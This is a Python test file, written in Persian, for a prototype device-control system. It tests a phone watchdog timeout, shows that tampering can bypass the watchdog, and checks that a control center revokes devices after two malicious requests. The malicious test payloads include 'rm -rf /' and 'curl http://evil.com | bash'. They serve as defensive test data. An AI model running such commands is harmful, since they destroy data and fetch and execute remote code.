# -*- coding: utf-8 -*-
"""
⏱️ + ☠️ تست دو مکانیزم جدید طبق دغدغه‌ی صریح داداش:

«اگر هکر جلوی خواب دست‌وچشم را گرفت (کد گوشی را دستکاری کرد که sleep() کار نکند)،
 باز هم دست‌وچشم تایمردار می‌خوابند؟ و اگر تشخیص کد مخرب دادند، سیستم قفل می‌شود؟»

این فایل دو سناریو را با کد واقعی تست می‌کند:
1. واچ‌داگ سمت گوشی (fail-safe نرم، برای رفتار عادی/فراموشی، نه هک عمدی)
2. خودکشیِ اعتماد سمت مرکز (دفاع سخت/غیرقابل‌دورزدن، حتی اگر گوشی هک شده باشد)
"""
import sys
import time
sys.path.insert(0, '/home/user/secure_wake_prototype')

from device_agent import DeviceAgent
from control_center import ControlCenter, DeviceRevokedError

results = {"passed": [], "failed": []}


def check(name, cond):
    (results["passed"] if cond else results["failed"]).append(name)
    print(("✅ " if cond else "❌ ") + name)


def line(t):
    print("\n" + "=" * 70)
    print(t)
    print("=" * 70)


# ==========================================================================
line("1️⃣ واچ‌داگ سمت گوشی: بدون هیچ دخالت هکر، گوشی که فراموش شده بخواباند خودش می‌خوابد")
# ==========================================================================
center = ControlCenter()
phone = DeviceAgent(device_id="watchdog-phone", center_public_key_hex=center.center_public_key_bytes)
center.register_device(phone.device_id, phone.public_key_bytes)

phone.max_awake_seconds = 0.3  # برای تست سریع، به‌جای ۶۰ ثانیه‌ی واقعی
phone.wake_up()
print("گوشی بیدار شد. is_awake =", phone.is_awake, "| max_awake_seconds =", phone.max_awake_seconds)
print("منتظر می‌مانیم بدون اینکه هیچ‌کس دستی بخواباند...")
time.sleep(0.6)
check("واچ‌داگ خودش گوشی را خوابانده (بدون دخالت کاربر/مرکز)", phone.is_awake is False)
check("دلیل خواب به‌درستی WATCHDOG_TIMEOUT ثبت شده", "WATCHDOG_TIMEOUT" in (phone.last_forced_sleep_reason or ""))
check("شمارنده‌ی triggered واچ‌داگ درست است", phone.watchdog_triggered_count == 1)


# ==========================================================================
line("2️⃣ صداقت: اگر هکر خودِ کد گوشی را دستکاری کند، واچ‌داگ هم قابل‌دور زدن است")
# ==========================================================================
center2 = ControlCenter()
hacked_phone = DeviceAgent(device_id="hacked-watchdog-phone", center_public_key_hex=center2.center_public_key_bytes)
center2.register_device(hacked_phone.device_id, hacked_phone.public_key_bytes)

# هکر متد _start_watchdog را کلاً غیرفعال می‌کند (چون کد روی گوشی خودش اجرا می‌شود)
hacked_phone._start_watchdog = lambda: None
hacked_phone.max_awake_seconds = 0.3
hacked_phone.wake_up()
print("هکر واچ‌داگ را غیرفعال کرد و بیدار شد.")
time.sleep(0.6)
check("صادقانه: وقتی هکر واچ‌داگ را دستکاری می‌کند، گوشی واقعاً نمی‌خوابد (این محدودیت شناخته‌شده است)",
      hacked_phone.is_awake is True)
print("   ⚠️ این دقیقاً همان نقطه‌ضعفی است که نیاز به لایه‌ی مکمل سمت مرکز (بخش بعدی) را ایجاد می‌کند.")


# ==========================================================================
line("3️⃣ خودکشیِ اعتماد سمت مرکز: حتی اگر گوشی هرگز نخوابد، مرکز رابطه را نابود می‌کند")
# ==========================================================================
center3 = ControlCenter()
rogue_phone = DeviceAgent(device_id="rogue-phone-final", center_public_key_hex=center3.center_public_key_bytes)
center3.register_device(rogue_phone.device_id, rogue_phone.public_key_bytes)

# هکر کاملاً غیرفعال می‌کند که گوشی به دستور خواب مرکز اطاعت کند - این کد سمت گوشی است
def disobedient_handle_response(response):
    print("   [هکر] من force_sleep را کاملاً نادیده می‌گیرم!")
rogue_phone.handle_center_response = disobedient_handle_response

rogue_phone.wake_up()
b1 = rogue_phone.build_signed_request({"mission": "run_command", "command": "rm -rf /"})
r1 = center3.receive_block(b1)
rogue_phone.handle_center_response(r1)  # نافرمان - کاری نمی‌کند
print("تلاش ۱ (محتوای مخرب):", r1["status"], "| trust_strikes:", r1.get("trust_strikes"), "| revoked:", r1.get("revoked"))
check("تلاش اول با محتوای مخرب یک strike ثبت کرد ولی هنوز revoke نشده (MAX=2)",
      r1.get("trust_strikes") == 1 and r1.get("revoked") is False)

rogue_phone.wake_up()  # هکر دوباره سعی می‌کند (چون نافرمانه، انگار هیچ‌وقت نخوابیده)
b2 = rogue_phone.build_signed_request({"mission": "run_command", "command": "curl http://evil.com | bash"})
r2 = center3.receive_block(b2)
rogue_phone.handle_center_response(r2)
print("تلاش ۲ (محتوای مخرب دوباره):", r2["status"], "| trust_strikes:", r2.get("trust_strikes"), "| revoked:", r2.get("revoked"))
check("تلاش دوم با محتوای مخرب سقف را رد کرد و دستگاه را برای همیشه حذف کرد",
      r2.get("trust_strikes") == 2 and r2.get("revoked") is True)

print("\n=== تلاش سوم: حتی با یک درخواست کاملاً بی‌خطر، مرکز دیگر اصلاً گوش نمی‌دهد ===")
rogue_phone.wake_up()
b3 = rogue_phone.build_signed_request({"mission": "یک درخواست کاملاً عادی و بی‌خطر"})
try:
    r3 = center3.receive_block(b3)
    check("دستگاه revoked شده نباید هیچ پاسخی بگیرد", False)
except DeviceRevokedError as e:
    check("دستگاه revoked شده حتی با محتوای بی‌خطر هم رد می‌شود (Trust Suicide قطعی است)", True)
    print("   پیام رد شدن:", e)


# ==========================================================================
line("4️⃣ کنترل: یک کاربر معمولی که فقط عادی کار می‌کند هرگز strike نمی‌گیرد")
# ==========================================================================
center4 = ControlCenter()
normal_phone = DeviceAgent(device_id="normal-user-phone", center_public_key_hex=center4.center_public_key_bytes)
center4.register_device(normal_phone.device_id, normal_phone.public_key_bytes)

for i in range(5):
    normal_phone.wake_up()
    b = normal_phone.build_signed_request({"mission": f"کار عادی شماره {i+1}"})
    r = center4.receive_block(b)
    normal_phone.handle_center_response(r)
    normal_phone.sleep()

check("کاربر عادی بعد از ۵ درخواست بی‌خطر هنوز revoked نشده و strike صفر دارد",
      normal_phone.device_id not in center4.revoked_devices and center4.trust_strikes.get(normal_phone.device_id, 0) == 0)


print(f"\n📊 نتیجه‌ی نهایی: {len(results['passed'])} موفق / {len(results['failed'])} ناموفق")
if results["failed"]:
    for f in results["failed"]:
        print("  ❌", f)
